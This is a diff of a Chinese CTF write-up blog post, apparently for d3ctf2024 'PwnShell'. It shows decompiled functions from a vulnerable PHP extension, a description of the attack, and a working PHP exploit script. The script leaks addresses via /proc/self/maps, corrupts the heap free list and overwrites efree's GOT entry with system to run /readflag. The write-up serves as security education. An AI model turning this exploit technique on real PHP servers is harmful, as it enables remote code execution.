+    <span class="token operator">||</span> <span class="token punctuation">(</span>v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9<span class="token punctuation">,</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">></span> <span class="token number">0xFuLL</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  v5 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>
+  v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>
+  v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">8LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">memcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">_efree</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">*</span>v5 <span class="token operator">=</span> v8<span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>edithacker函数的用途是编辑和更新指定索引的 chunk 数据，如果新数据小于或等于当前 chunk 的大小则直接覆盖，否则重新分配内存并复制新数据</p>
-<h4 id="zif-displayHacker"><a href="#zif-displayHacker" class="headerlink" title="zif_displayHacker"></a>zif_displayHacker</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_displayHacker</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v4, &amp;unk_2001, &amp;v10, a4) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(v10 + <span class="number">8</span>) != <span class="number">4</span></span><br><span class="line">      || (v6 = (<span class="type">char</span> *)&amp;chunkList + <span class="number">16</span> * *(_QWORD *)v10, v6[<span class="number">8</span>] == <span class="number">1</span>)</span><br><span class="line">      || *(_QWORD *)v10 &gt; <span class="number">0xF</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = **(<span class="type">const</span> <span class="type">char</span> ***)v6;</span><br><span class="line">      v8 = <span class="built_in">strlen</span>(v7);</span><br><span class="line">      v9 = (_QWORD *)_emalloc((v8 + <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      *v9 = <span class="number">0x1600000001</span>LL;</span><br><span class="line">      v9[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">      v9[<span class="number">2</span>] = v8;</span><br><span class="line">      <span class="built_in">memcpy</span>(v9 + <span class="number">3</span>, v7, v8);</span><br><span class="line">      *((_BYTE *)v9 + v8 + <span class="number">24</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)a2 = v9;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">262</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v11 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="zif-displayHacker"><a href="#zif-displayHacker" class="headerlink" title="zif_displayHacker"></a>zif_displayHacker</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">zif_displayHacker</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> __int64 a4<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// r13</span>
+  <span class="token class-name">size_t</span> v8<span class="token punctuation">;</span> <span class="token comment">// r12</span>
+  _QWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
+  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-38h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-30h]</span>
+
+  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2001<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v10<span class="token punctuation">,</span> a4<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v10 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span>
+      <span class="token operator">||</span> <span class="token punctuation">(</span>v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10<span class="token punctuation">,</span> v6<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
+      <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">></span> <span class="token number">0xFuLL</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v6<span class="token punctuation">;</span>
+      v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v9 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFF8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token operator">*</span>v9 <span class="token operator">=</span> <span class="token number">0x1600000001LL</span><span class="token punctuation">;</span>
+      v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+      v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>
+      <span class="token function">memcpy</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">+</span> v8 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a2 <span class="token operator">=</span> v9<span class="token punctuation">;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">262</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>displahacker函数的用途是根据指定索引从chunklist中获取对应chunk的数据，然后返回一个对应的字符串对象</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p><a target="_blank" rel="noopener" href="https://a1ex.online/2021/03/06/2021-antCTF/">https://a1ex.online/2021/03/06/2021-antCTF/</a></p>
 <p><a target="_blank" rel="noopener" href="https://qanux.github.io/2024/04/29/d3ctf2024/index.html#PwnShell">https://qanux.github.io/2024/04/29/d3ctf2024/index.html#PwnShell</a></p>
 <p>通过linux 伪文件系统泄露libc基地址和模块基地址后，通过堆风水破坏free list构造任意地址写的原语，将 efree的got表覆盖成system，之后去free一个内容为 binsh的堆就好了，不过php pwn不能直接getshell，得反弹shell或者是用readflag把 flag读出来</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>;<span class="variable">$i</span> &gt;= <span class="number">0</span>;<span class="variable">$i</span>--) <span class="variable">$hex</span>.= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4c490</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x3f</span>);</span><br><span class="line"><span class="comment">// fgetc(STDIN);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">0xe</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="number">0x61</span> + <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$aa</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>, <span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$aa</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$aaa</span>, <span class="variable">$b</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fgetc(STDIN);</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>,<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">7</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;c&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">8</span>, <span class="title function_ invoke__">int2str</span>(<span class="variable">$mod_base</span>+<span class="variable">$efree_got</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">int2str</span>(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="comment">// fgetc(STDIN);</span></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function-definition function">str2Hex</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$hex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token variable">$hex</span><span class="token operator">.=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$hex</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$hex</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$hex</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-    </article>
-    <!-- license -->
+<span class="token keyword">function</span> <span class="token function-definition function">int2Str</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$x</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$re</span> <span class="token operator">.=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'C'</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$i</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">leakaddr</span><span class="token punctuation">(</span><span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">global</span> <span class="token variable">$libc</span><span class="token punctuation">,</span><span class="token variable">$mbase</span><span class="token punctuation">;</span>
+    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/'</span><span class="token punctuation">;</span>
+    <span class="token variable">$p1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/'</span><span class="token punctuation">;</span>
